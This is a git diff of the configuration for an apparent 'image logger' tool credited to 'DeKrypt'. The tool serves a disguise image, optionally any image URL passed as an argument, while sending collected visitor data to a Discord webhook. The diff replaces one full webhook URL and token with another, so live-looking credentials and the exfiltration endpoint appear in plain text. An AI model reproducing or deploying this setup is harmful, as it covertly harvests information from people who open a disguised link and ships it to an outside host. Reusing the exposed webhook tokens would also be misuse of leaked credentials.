@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1294351896072683600/3hhGLRFu_R19eetY48IcQXnyyhzDCaOs3rIbQlaZvoW1mdx0dy02BcrARNn8kRldF1e1",
+    "webhook": "https://discord.com/api/webhooks/1456984397298401346/P2Red_aQmbEdAZPHvzZbr99z90TXGdIZf3GnaRwwF0wx35-UJ3NOA2QztkbwYGPa2mhm",
     "image": "https://www.instalki.pl/wp-content/uploads/2025/07/Windows-XP-przegladarka-internetowa.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
